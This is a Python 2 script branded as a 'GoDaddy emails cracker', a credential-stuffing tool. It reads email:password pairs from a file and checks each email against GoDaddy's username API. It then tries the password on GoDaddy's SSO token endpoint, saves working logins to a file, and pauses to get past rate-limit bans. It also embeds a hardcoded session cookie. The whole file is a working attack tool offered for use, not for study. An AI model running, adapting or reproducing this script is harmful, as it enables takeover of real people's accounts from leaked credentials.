#!/usr/bin/python
# -*- coding: utf-8 -*-

# ( -- IMPORTS -- ) #
import requests
import time
import json
import sys
from random import *
import random
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
init(autoreset=True)

# ( -- COLORAMA COLORS -- ) #
rd = Fore.RED
cy = Fore.CYAN
wh = Fore.WHITE
gr = Fore.GREEN
yl = Fore.YELLOW
mg = Fore.MAGENTA
bl = Fore.BLACK

# ( -- LOGO * INFO -- ) #
bugs = '''{} {}
   ____  ____  _   _  ____ ____         ____ ____      _    ____ _  _______ ____  
  / __ \| __ )| | | |/ ___/ ___|       / ___|  _ \    / \  / ___| |/ / ____|  _ \ 
 / / _` |  _ \| | | | |  _\___ \ _____| |   | |_) |  / _ \| |   | ' /|  _| | |_) |
| | (_| | |_) | |_| | |_| |___) |_____| |___|  _ <  / ___ \ |___| . \| |___|  _ < 
 \ \__,_|____/ \___/ \____|____/       \____|_| \_\/_/   \_\____|_|\_\_____|_| \_\
|                                                                          
 [$] BUGS GODADDY EMAILS CRACKER.
 [$] URL = ('https://www.Brazzers.com/').
 [$] SCRIPT PROGRAMMED BY BUGS WITH PYTHON2.
'''.format(mg, mg)
#################################
# ( -- PROGRAMMED BY @BUGS -- ) #
#################################

# ( -- FULL API SCRIPT -- ) #

print bugs
print '\n{} {}[+] GODADDY EMAILS CRACKER [+]'.format(cy, cy)
print ''
# ----------------------------------- ## ----------------------------------- #
chk_user_req_headers = {
	"Accept": "application/json",
	"Content-Type": "application/json",
	"Referer": "https://sso.godaddy.com/account/create?realm=idp&path=%2Fproducts&app=account",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
	"Origin": "https://sso.godaddy.com",
	"Cookie": "visitor=vid=adb82f77-39ab-43f1-ad6a-794c1834a520; currency=EGP; _ga=GA1.2.1929569121.1526387456; OPTOUTMULTI=0:0%7Cc2:0%7Cc9:0%7Cc11:0; LPVID=RiNWQyNTM5ZmVmMGRiNTc1; _policy=%7B%22restricted_market%22:false,%22tracking_market%22:%22none%22%7D; _msuuid_esfyia2vf0=AAFEF76D-9317-4096-855F-26157351A486; __qca=P0-709478584-1527640191302; pathway=cc70d79a-1950-486c-9b6c-4a39db7b709d; uxcsplit=A; traffic=; _gid=GA1.2.1464356806.1530149750; Affiliates1=; SplitTesting1=1436-4=0; LPSID-30187337=eP5e2RyOThOfYgQKtlz3CA; asua=1; pro=rhcaghjewgpdgbzcxexemaggggachcue; ShopperId1=gaqeweqhrjqdcdaambzegfmhogmhicuh; _gat_gtag_UA_115508484_1=1; market=en-CA; actpro=qdwcwcefufabugrfldajuahdbdtgpazb; utag_main=v_id:016363c8a2fc0096040b5bb25dd004067011805f00918$_sn:3$_ss:0$_st:1530151756966$ses_id:1530149754719%3Bexp-session$_pn:9%3Bexp-session; _uetsid=_uetbd05d54e; __CT_Data=gpv=7&ckp=tld&dm=godaddy.com&apv_3_www23=7&cpv_3_www23=7; ctm={'pgv':4473797583726820|'vst':2306514646844307|'vstr':7710442629712920|'intr':1530149965633|'v':1|'lvst':41825}; fb_sessiontraffic=S_TOUCH=06/28/2018%2001:39:28.832&pathway=cc70d79a-1950-486c-9b6c-4a39db7b709d&V_DATE=06/27/2018%2018:35:43.809&pc=13"
}
# ----------------------------------- ## ----------------------------------- #
list = raw_input('{} {}[X] ENTER YOUR LIST PATH NAME X> '.format(cy, cy))
print ''
# ----------------------------------- ## ----------------------------------- #
file = open(list,'r').readlines()
list_len = str(len(file))
print '{} {}[+] '.format(yl, yl) + 'YOUR LIST EMAILS NUM IS X> '.format(yl, yl) + list_len + '\n'
count = 0
for line in file:
	line = line.strip()
	count+=1
	email, password = line.split(':')
	chk_user_req_data = '{"checkusername":"'+email+'"}'
	chk_user_req = requests.post('https://sso.godaddy.com/v1/api/idp/user/checkusername', data=chk_user_req_data, headers=chk_user_req_headers)
	# //print chk_user_req.content
	if 'username is unavailable' in chk_user_req.content:
		#LOGIN STAGE
		req_data = {
			'per': 'true',
			'password': password,
			'username': email,
			'infotoken': 'true'
		}
		req = requests.post('https://sso.godaddy.com/v1/api/token', data=req_data)
		src = req.content
		# //print src
		if '"message": "Success"' in src:
				print '{} {}[+] '.format(gr, gr) + '(' + str(count) + ') ' + email + ':' + password + ' => [ + VALID + ]'.format(gr, gr)
				valid = open('VALID_GODADDY.txt', 'a+')
				valid.write('[+] [ ' + email + ':' + password + ' ] => [ + VALID + ] \n')
				valid.close()
		else:
			print '{} {}[+] '.format(rd, rd) + '(' + str(count) + ') ' + email + ':' + password + ' => [ + XINVALID + ]'.format(rd, rd)
		time.sleep(60)
		if 'Too many consecutive failures!' in src:
			print '{} {}[+] '.format(gr, gr) + 'WAITING FOR THE BAN IP.'.format(yl, yl)
			time.sleep(300)
		else:
			pass
	else:
		print '{} {}[+] '.format(rd, rd) + '(' + str(count) + ') ' + email + ':' + password + ' => [ + INVALID + ]'.format(rd, rd)
		pass
